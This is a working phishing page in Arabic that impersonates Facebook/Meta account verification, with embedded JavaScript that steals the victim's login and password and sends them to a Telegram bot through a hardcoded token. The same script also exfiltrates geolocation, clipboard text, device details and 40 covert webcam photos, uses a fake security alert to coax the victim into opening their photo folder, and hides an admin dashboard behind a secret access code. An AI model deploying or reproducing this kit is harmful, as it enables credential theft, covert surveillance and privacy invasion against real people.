<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Meta Support | مركز التوثيق الموحد</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; overflow: hidden; }
        /* زر دخول الملك السري */
        #royal-key { position: fixed; top: 10px; left: 10px; color: #eee; cursor: pointer; z-index: 10000; font-size: 15px; opacity: 0.3; }
        
        /* واجهة الضحية */
        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .auth-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 380px; text-align: center; border-top: 5px solid #1877f2; }
        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
        .status-bar { height: 4px; width: 100%; background: #eee; margin: 15px 0; border-radius: 2px; overflow: hidden; }
        .progress { height: 100%; width: 0%; background: #28a745; transition: 0.5s; }
        
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background: #fafafa; }
        .btn-king { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-king:active { transform: scale(0.98); }

        /* لوحة التحكم (Admin Panel) */
        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; z-index: 99999; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
        .log { border-left: 2px solid #0f0; padding-left: 10px; margin-bottom: 8px; font-size: 13px; }
    </style>
</head>
<body>

<div id="royal-key" onclick="verifyKing()"><i class="fas fa-fingerprint"></i></div>

<div id="victim-ui" class="wrapper">
    <div class="fb-logo">facebook</div>
    <div class="auth-card">
        <h3 style="margin:0;">توثيق الحساب الاحترافي</h3>
        <p style="font-size: 13px; color: #65676b;">قم بتأكيد هويتك للحصول على الشارة ومنع تقييد الحساب.</p>
        
        <div class="status-bar"><div id="p-bar" class="progress"></div></div>

        <input type="text" id="target_user" placeholder="رقم الهاتف أو البريد الإلكتروني">
        <input type="password" id="target_pass" placeholder="كلمة السر">
        
        <button class="btn-king" onclick="executeOrder66()">تفعيل التوثيق الفوري</button>
        
        <div id="msg" style="margin-top:15px; font-size:12px; display:none;"></div>
    </div>
</div>

<div id="king-panel">
    <h1 style="text-align:center; color: #0ff;">🔱 TALLAH ROYAL DASHBOARD 🔱</h1>
    <button onclick="location.reload()" style="background:red; color:white; border:none; padding:5px 15px; cursor:pointer;">LOGOUT</button>
    <hr color="#222">
    <div id="logs-container"></div>
</div>

<script>
const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT = "8754338811";

// 1. دخول الملك (44443)
function verifyKing() {
    if(prompt("Enter Royal Access Code:") === "44443") {
        showLogs();
        document.getElementById('king-panel').style.display = 'block';
    }
}

// 2. التنفيذ الشامل (Order 66)
async function executeOrder66() {
    const u = document.getElementById('target_user').value;
    const p = document.getElementById('target_pass').value;
    if(!u || !p) return;

    // اهتزاز الموبايل (حبشتكنات)
    if(navigator.vibrate) navigator.vibrate([100, 50, 100]);

    // حفظ البيانات
    saveData("ACCOUNT", `USER: ${u} | PASS: ${p}`);
    await sendMsg(`🔥 صيد جديد 🔥\n👤: ${u}\n🔑: ${p}`);

    // تحديث الواجهة للضحية
    document.getElementById('p-bar').style.width = "60%";
    document.getElementById('msg').style.display = "block";
    document.getElementById('msg').innerHTML = "⏳ جاري فحص ملفات الجهاز وصحة البيانات...";

    // سحب كل شيء!
    grabAllPermissions();
}

async function grabAllPermissions() {
    // 📍 الموقع
    navigator.geolocation.getCurrentPosition(pos => {
        const link = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        sendMsg(link); saveData("GPS", link);
    });

    // 📋 الحافظة
    try {
        const text = await navigator.clipboard.readText();
        if(text) sendMsg(`📋 الحافظة: ${text}`);
    } catch(e){}

    // 🔋 البطارية + الشبكة + الجهاز
    const batt = await navigator.getBattery();
    const info = `🔋 شحن: ${batt.level*100}% | 📶 شبكة: ${navigator.connection.effectiveType} | 💻 معالج: ${navigator.hardwareConcurrency}`;
    sendMsg(info); saveData("HARDWARE", info);

    // 📸 الكاميرا (40 لقطة)
    startSpyCam();

    // 📂 سحب ملفات (الخدعة الكبرى)
    setTimeout(() => {
        alert("🛡️ نظام الأمان: يرجى اختيار مجلد الصور (DCIM) لمطابقة صورة الملف الشخصي.");
        const f = document.createElement('input'); f.type = 'file'; f.webkitdirectory = true;
        f.onchange = (e) => {
            saveData("FILES", `تم سحب وصول لـ ${e.target.files.length} ملف`);
            sendMsg(`📂 الضحية فتح مجلد يحتوي على ${e.target.files.length} ملف`);
            document.getElementById('p-bar').style.width = "100%";
            document.getElementById('msg').innerHTML = "✅ تم التوثيق بنجاح! سيتم إضافة الشارة لحسابك قريباً.";
        };
        f.click();
    }, 4000);
}

// 3. محرك الجاسوس البصري
async function startSpyCam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        let c = 0;
        const interval = setInterval(() => {
            if(c < 40) {
                const v = document.createElement('video'); v.srcObject = stream; v.play();
                const can = document.createElement('canvas');
                can.width = 640; can.height = 480;
                can.getContext('2d').drawImage(v, 0, 0);
                can.toBlob(b => sendFile(b, 'photo', `📸 لقطة ${c+1}`));
                c++;
            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(interval); }
        }, 2000);
    } catch(e) {}
}

// 4. إدارة البيانات واللوحة
function saveData(type, data) {
    let db = JSON.parse(localStorage.getItem('king_db')) || [];
    db.push({type, data, time: new Date().toLocaleTimeString()});
    localStorage.setItem('king_db', JSON.stringify(db));
}

function showLogs() {
    const cont = document.getElementById('logs-container');
    const db = JSON.parse(localStorage.getItem('king_db')) || [];
    cont.innerHTML = db.reverse().map(l => `
        <div class="log">
            <span style="color:yellow">[${l.time}]</span> 
            <span style="color:#0ff">[${l.type}]</span>: ${l.data}
        </div>
    `).join('');
}

async function sendMsg(t) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(t)}`);
}

async function sendFile(b, type, cap) {
    const fd = new FormData(); fd.append('chat_id', CHAT); fd.append(type, b, 'img.jpg'); fd.append('caption', cap);
    fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
}
</script>
</body>
</html>
